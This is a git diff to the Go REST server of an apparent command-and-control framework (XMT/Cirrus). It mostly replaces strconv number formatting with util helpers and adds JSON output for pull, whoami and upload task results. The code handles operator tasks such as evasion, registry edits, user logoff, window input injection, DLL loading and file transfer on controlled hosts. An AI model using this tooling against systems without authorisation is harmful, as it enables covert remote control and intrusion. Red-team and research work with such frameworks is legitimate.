@@ -37,6 +37,7 @@ import (
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/device/winapi"
+	"github.com/iDigitalFlame/xmt/util"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
@@ -309,7 +310,7 @@ func evadePacket(a string) (*com.Packet, string, error) {
 			}
 		}
 	}
-	return task.Evade(f), "evade " + a + "/" + strconv.FormatUint(uint64(f), 16), nil
+	return task.Evade(f), "evade " + a + "/" + util.Uitoa16(uint64(f)), nil
 }
 func (c *Cirrus) context(_ net.Listener) context.Context {
 	return c.ctx
@@ -320,6 +321,9 @@ func writeJobJSON(z bool, t uint8, j *com.Packet, w io.Writer) error {
 	}
 	o := base64.NewEncoder(base64.StdEncoding, w)
 	switch w.Write([]byte(`{"type":"`)); t {
+	case task.TvPull:
+		w.Write([]byte(`pull","data":"`))
+		io.Copy(o, j)
 	case task.TvNetcat:
 		r, err := result.Netcat(j)
 		if err != nil {
@@ -334,7 +338,7 @@ func writeJobJSON(z bool, t uint8, j *com.Packet, w io.Writer) error {
 		}
 		w.Write([]byte(
 			`download","path":` + escape.JSON(p) +
-				`,"size":` + strconv.FormatUint(n, 10) +
+				`,"size":` + util.Uitoa(n) +
 				`,"dir":` + strconv.FormatBool(d) + `,"data":"`,
 		))
 		io.Copy(o, r)
@@ -356,8 +360,8 @@ func writeJobJSON(z bool, t uint8, j *com.Packet, w io.Writer) error {
 			return err
 		}
 		w.Write([]byte(
-			`execute", "pid":` + strconv.FormatUint(uint64(p), 10) +
-				`,"exit":` + strconv.Itoa(int(c)) + `,"data":"`),
+			`execute", "pid":` + util.Uitoa(uint64(p)) +
+				`,"exit":` + util.Itoa(int64(c)) + `,"data":"`),
 		)
 		io.Copy(o, r)
 	default:
@@ -373,7 +377,7 @@ func ioPacket(c routex.Content, a string) (*com.Packet, string, error) {
 	switch strings.ToLower(a) {
 	case "kill":
 		if i := c.UintDefault("pid", 0); i > 0 {
-			return task.Kill(uint32(i)), "kill " + strconv.FormatUint(i, 10), nil
+			return task.Kill(uint32(i)), "kill " + util.Uitoa(i), nil
 		}
 		return nil, "", errInvalidPID
 	case "touch":
@@ -431,12 +435,12 @@ func uiPacket(c routex.Content, a string) (*com.Packet, string, error) {
 		if h == negOne {
 			return nil, "", errInvalidHandle
 		}
-		return task.WindowClose(h), "window " + strconv.FormatUint(h, 16) + " close", nil
+		return task.WindowClose(h), "window " + util.Uitoa16(h) + " close", nil
 	case "fg", "focus":
 		if h == 0 || h == negOne {
 			return nil, "", errInvalidHandle
 		}
-		return task.WindowFocus(h), "window " + strconv.FormatUint(h, 16) + " focus", nil
+		return task.WindowFocus(h), "window " + util.Uitoa16(h) + " focus", nil
 	case "sw", "show", "desktop":
 		if h == negOne {
 			return nil, "", errInvalidHandle
@@ -474,7 +478,7 @@ func uiPacket(c routex.Content, a string) (*com.Packet, string, error) {
 				}
 			}
 		}
-		return task.WindowShow(h, n), "window " + strconv.FormatUint(h, 16) + " show " + strconv.FormatUint(uint64(n), 10), nil
+		return task.WindowShow(h, n), "window " + util.Uitoa16(h) + " show " + util.Uitoa(uint64(n)), nil
 	case "tr", "trans", "transparent":
 		if h == negOne {
 			return nil, "", errInvalidHandle
@@ -483,16 +487,15 @@ func uiPacket(c routex.Content, a string) (*com.Packet, string, error) {
 		if n > 255 {
 			n = 255
 		}
-		return task.WindowTransparency(h, uint8(n)), "window " + strconv.FormatUint(h, 16) + " transparency " +
-			strconv.FormatUint(n, 10), nil
+		return task.WindowTransparency(h, uint8(n)), "window " + util.Uitoa16(h) + " transparency " + util.Uitoa(n), nil
 	case "dis", "en", "disable", "enable":
 		if h == negOne {
 			return nil, "", errInvalidHandle
 		}
 		if a[0] == 'E' || a[0] == 'e' {
-			return task.WindowEnable(h, true), "window " + strconv.FormatUint(h, 16) + " enable", nil
+			return task.WindowEnable(h, true), "window " + util.Uitoa16(h) + " enable", nil
 		}
-		return task.WindowEnable(h, false), "window " + strconv.FormatUint(h, 16) + " disable", nil
+		return task.WindowEnable(h, false), "window " + util.Uitoa16(h) + " disable", nil
 	case "mv", "pos", "move", "size", "resize":
 		if h == 0 || h == negOne {
 			return nil, "", errInvalidHandle
@@ -510,15 +513,15 @@ func uiPacket(c routex.Content, a string) (*com.Packet, string, error) {
 		if n, err := c.Int("height"); err == nil {
 			v = int32(n)
 		}
-		return task.WindowMove(h, x, y, w, v), "window " + strconv.FormatUint(h, 16) + " move " +
-			strconv.FormatInt(int64(x), 10) + " " + strconv.FormatInt(int64(y), 10) + " " + strconv.FormatInt(int64(w), 10) + " " +
-			strconv.FormatInt(int64(v), 10), nil
+		return task.WindowMove(h, x, y, w, v), "window " + util.Uitoa16(h) + " move " +
+			util.Itoa(int64(x)) + " " + util.Itoa(int64(y)) + " " + util.Itoa(int64(w)) + " " +
+			util.Itoa(int64(v)), nil
 	case "in", "send", "type", "text", "input":
 		if h == negOne {
 			return nil, "", errInvalidHandle
 		}
 		v := c.StringDefault("text", "")
-		return task.WindowSendInput(h, v), "window " + strconv.FormatUint(h, 16) + " sendinput" + hashSum([]byte(v)), nil
+		return task.WindowSendInput(h, v), "window " + util.Uitoa16(h) + " sendinput" + hashSum([]byte(v)), nil
 	case "mb", "msg", "msgbox", "message", "messagebox":
 		var (
 			f = c.UintDefault("flags", 0)
@@ -528,7 +531,7 @@ func uiPacket(c routex.Content, a string) (*com.Packet, string, error) {
 		if len(t) == 0 {
 			return nil, "", errInvalidTitle
 		}
-		m := "window msgbox " + strconv.FormatUint(h, 16)
+		m := "window msgbox " + util.Uitoa16(h)
 		if len(t) > 0 {
 			m += " " + t
 		}
@@ -550,16 +553,16 @@ func wtsPacket(c routex.Content, a string) (*com.Packet, string, error) {
 	case "ls":
 		return task.UserLogins(), "wts list", nil
 	case "ps":
-		return task.UserProcesses(int32(s)), "wts ps " + strconv.FormatInt(s, 10), nil
+		return task.UserProcesses(int32(s)), "wts ps " + util.Itoa(s), nil
 	case "logoff":
-		return task.UserLogoff(int32(s)), "wts logoff " + strconv.FormatInt(s, 10), nil
+		return task.UserLogoff(int32(s)), "wts logoff " + util.Itoa(s), nil
 	case "msg", "message":
 		return task.UserMessageBox(
 			int32(s), c.StringDefault("title", ""), c.StringDefault("text", ""), uint32(c.IntDefault("flags", 0)),
 			uint32(c.IntDefault("seconds", 0)), c.BoolDefault("wait", false),
-		), "wts message " + strconv.FormatInt(s, 10), nil
+		), "wts message " + util.Itoa(s), nil
 	case "dis", "disconnect":
-		return task.UserDisconnect(int32(s)), "wts disconnect " + strconv.FormatInt(s, 10), nil
+		return task.UserDisconnect(int32(s)), "wts disconnect " + util.Itoa(s), nil
 	}
 	return nil, "", errInvalidAction
 }
@@ -585,9 +588,9 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 				}
 				w.Write([]byte(
 					`{"name":` + escape.JSON(f[i].Name()) +
-						`,"mode":` + strconv.FormatUint(uint64(f[i].Mode()), 10) +
+						`,"mode":` + util.Uitoa(uint64(f[i].Mode())) +
 						`,"mode_str":"` + f[i].Mode().String() +
-						`","size":` + strconv.FormatUint(uint64(f[i].Size()), 10) +
+						`","size":` + util.Uitoa(uint64(f[i].Size())) +
 						`,"modtime":"` + f[i].ModTime().Format(time.RFC3339) + `"}`,
 				))
 			}
@@ -602,7 +605,7 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 		if err != nil {
 			return err
 		}
-		w.Write([]byte(`{"type":"spawn","pid":` + strconv.FormatUint(uint64(p), 10) + `}`))
+		w.Write([]byte(`{"type":"spawn","pid":` + util.Uitoa(uint64(p)) + `}`))
 	case task.MvScript:
 		if z {
 			return errInvalidScript
@@ -611,7 +614,7 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 		if err != nil {
 			return err
 		}
-		w.Write([]byte(`{"type":"script", "count":` + strconv.FormatUint(uint64(len(v)), 10) + `, "entries": [`))
+		w.Write([]byte(`{"type":"script", "count":` + util.Uitoa(uint64(len(v))) + `, "entries": [`))
 		for i := range v {
 			if i > 0 {
 				w.Write([]byte{','})
@@ -647,6 +650,12 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 			}
 		}
 		w.Write([]byte{']', '}'})
+	case task.MvWhoami:
+		u, p, err := result.Whoami(j)
+		if err != nil {
+			return err
+		}
+		w.Write([]byte(`{"type":"whoami","user":` + escape.JSON(u) + `, "path":` + escape.JSON(p) + `}`))
 	case task.MvRefresh:
 		w.Write([]byte(`{"type":"refresh"}`))
 	case task.MvMigrate:
@@ -666,8 +675,8 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 				w.Write([]byte(
 					`{"name":` + escape.JSON(p[i].Name) +
 						`,"user":` + escape.JSON(p[i].User) +
-						`,"pid":` + strconv.FormatUint(uint64(p[i].PID), 10) +
-						`,"ppid":` + strconv.FormatUint(uint64(p[i].PPID), 10) + `}`,
+						`,"pid":` + util.Uitoa(uint64(p[i].PID)) +
+						`,"ppid":` + util.Uitoa(uint64(p[i].PPID)) + `}`,
 				))
 			}
 		}
@@ -680,6 +689,16 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 		}
 	case task.TvUI:
 		w.Write([]byte(`{"type":"ui"}`))
+	case task.TvPull:
+		p, n, _, err := result.Pull(j) // Ignore the reader, as if true, we're already Seeked.
+		if err != nil {
+			return err
+		}
+		if len(p) == 0 && n == 0 {
+			// Pass back to writeJobJSON
+			return io.ErrClosedPipe
+		}
+		w.Write([]byte(`{"type":"upload","size":` + util.Uitoa(n) + `,"path":` + escape.JSON(p) + `}`))
 	case task.TvWait:
 		w.Write([]byte(`{"type":"wait"}`))
 	case task.TvTroll:
@@ -711,7 +730,7 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 				w.Write([]byte(
 					`{"user":` + escape.JSON(e[i].User) +
 						`,"host":` + escape.JSON(e[i].Host) +
-						`,"id":` + strconv.FormatUint(uint64(e[i].ID), 10) +
+						`,"id":` + util.Uitoa(uint64(e[i].ID)) +
 						`,"from":"` + e[i].From.String() +
 						`","login_time":"` + e[i].Login.Format(time.RFC3339) +
 						`","last_input_time":"` + e[i].LastInput.Format(time.RFC3339) +
@@ -720,6 +739,12 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 			}
 		}
 		w.Write([]byte{']', '}'})
+	case task.TvUpload:
+		p, n, err := result.Upload(j)
+		if err != nil {
+			return err
+		}
+		w.Write([]byte(`{"type":"upload","size":` + util.Uitoa(n) + `,"path":` + escape.JSON(p) + `}`))
 	case task.TvElevate:
 		w.Write([]byte(`{"type":"elevate"}`))
 	case task.TvRevSelf:
@@ -767,7 +792,7 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 			w.Write([]byte(`{"type":"system_io", "status":true}`))
 			return nil
 		}
-		w.Write([]byte(`{"type":"system_io","path":` + escape.JSON(p) + `,"size":` + strconv.FormatUint(s, 10) + `}`))
+		w.Write([]byte(`{"type":"system_io","path":` + escape.JSON(p) + `,"size":` + util.Uitoa(s) + `}`))
 	case task.TvLoginsAct:
 		w.Write([]byte(`{"type":"logins_action"}`))
 	case task.TvLoginUser:
@@ -784,13 +809,13 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 				}
 				w.Write([]byte(
 					`{"name":` + escape.JSON(e[i].Name) +
-						`,"handle":` + strconv.FormatUint(uint64(e[i].Handle), 10) +
+						`,"handle":` + util.Uitoa(uint64(e[i].Handle)) +
 						`,"minimized":` + strconv.FormatBool(e[i].IsMinimized()) +
 						`,"maximized":` + strconv.FormatBool(e[i].IsMaximized()) +
-						`,"x":` + strconv.FormatInt(int64(e[i].X), 10) +
-						`,"y":` + strconv.FormatInt(int64(e[i].Y), 10) +
-						`,"width":` + strconv.FormatInt(int64(e[i].Width), 10) +
-						`,"height":` + strconv.FormatInt(int64(e[i].Height), 10) + `}`,
+						`,"x":` + util.Itoa(int64(e[i].X)) +
+						`,"y":` + util.Itoa(int64(e[i].Y)) +
+						`,"width":` + util.Itoa(int64(e[i].Width)) +
+						`,"height":` + util.Itoa(int64(e[i].Height)) + `}`,
 				))
 			}
 		}
@@ -808,8 +833,8 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 				w.Write([]byte(
 					`{"name":` + escape.JSON(p[i].Name) +
 						`,"user":` + escape.JSON(p[i].User) +
-						`,"pid":` + strconv.FormatUint(uint64(p[i].PID), 10) +
-						`,"ppid":` + strconv.FormatUint(uint64(p[i].PPID), 10) + `}`,
+						`,"pid":` + util.Uitoa(uint64(p[i].PID)) +
+						`,"ppid":` + util.Uitoa(uint64(p[i].PPID)) + `}`,
 				))
 			}
 		}
@@ -825,19 +850,13 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 					w.Write([]byte{','})
 				}
 				w.Write([]byte(
-					`{"hash":` + strconv.FormatUint(uint64(e[i].Hash), 10) +
-						`,"original":` + strconv.FormatUint(uint64(e[i].Original), 10) +
-						`,"swapped":` + strconv.FormatUint(uint64(e[i].Swapped), 10) + `}`,
+					`{"hash":` + util.Uitoa(uint64(e[i].Hash)) +
+						`,"original":` + util.Uitoa(uint64(e[i].Original)) +
+						`,"swapped":` + util.Uitoa(uint64(e[i].Swapped)) + `}`,
 				))
 			}
 		}
 		w.Write([]byte{']', '}'})
-	case task.TvUpload, task.TvPull:
-		p, n, err := result.Upload(j)
-		if err != nil {
-			return err
-		}
-		w.Write([]byte(`{"type":"upload","size":` + strconv.FormatUint(n, 10) + `,"path":` + escape.JSON(p) + `}`))
 	case task.TvAssembly, task.TvDLL:
 		h, p, c, err := result.Assembly(j)
 		if err != nil {
@@ -849,9 +868,9 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 			w.Write([]byte(`{"type":"assembly",`))
 		}
 		w.Write([]byte(
-			`"handle":` + strconv.FormatUint(uint64(h), 10) +
-				`,"exit":` + strconv.FormatUint(uint64(c), 10) +
-				`,"pid":` + strconv.FormatUint(uint64(p), 10) + `}`,
+			`"handle":` + util.Uitoa(uint64(h)) +
+				`,"exit":` + util.Uitoa(uint64(c)) +
+				`,"pid":` + util.Uitoa(uint64(p)) + `}`,
 		))
 	default:
 		return io.ErrClosedPipe
@@ -861,7 +880,7 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 func writeError(c int, e string, w http.ResponseWriter, _ *routex.Request) {
 	w.Header().Set("Content-Type", "application/json; charset=utf-8")
 	w.WriteHeader(c)
-	w.Write([]byte(`{"source": "xmt_rest", "code": ` + strconv.Itoa(c) + `, "error": `))
+	w.Write([]byte(`{"source": "xmt_rest", "code": ` + util.Uitoa(uint64(c)) + `, "error": `))
 	if len(e) > 0 {
 		w.Write([]byte(escape.JSON(e)))
 	} else {
@@ -897,7 +916,7 @@ func registryPacket(c routex.Content, a, k, v string) (*com.Packet, string, erro
 			return task.RegSetBytes(k, v, b), "regedit edit " + k + ":" + v + hashSum(b), nil
 		case "uint32", "dword":
 			if i, ok := c.Uint("data"); ok == nil {
-				return task.RegSetDword(k, v, uint32(i)), "regedit edit " + k + ":" + v + " " + strconv.FormatUint(i, 10), nil
+				return task.RegSetDword(k, v, uint32(i)), "regedit edit " + k + ":" + v + " " + util.Uitoa(i), nil
 			}
 			var (
 				d      = c.StringDefault("data", "")
@@ -909,7 +928,7 @@ func registryPacket(c routex.Content, a, k, v string) (*com.Packet, string, erro
 			return task.RegSetDword(k, v, uint32(i)), "regedit edit " + k + ":" + v + " " + d, nil
 		case "uint64", "qword":
 			if i, ok := c.Uint("data"); ok == nil {
-				return task.RegSetQword(k, v, i), "regedit edit " + k + ":" + v + " " + strconv.FormatUint(i, 10), nil
+				return task.RegSetQword(k, v, i), "regedit edit " + k + ":" + v + " " + util.Uitoa(i), nil
 			}
 			var (
 				d      = c.StringDefault("data", "")
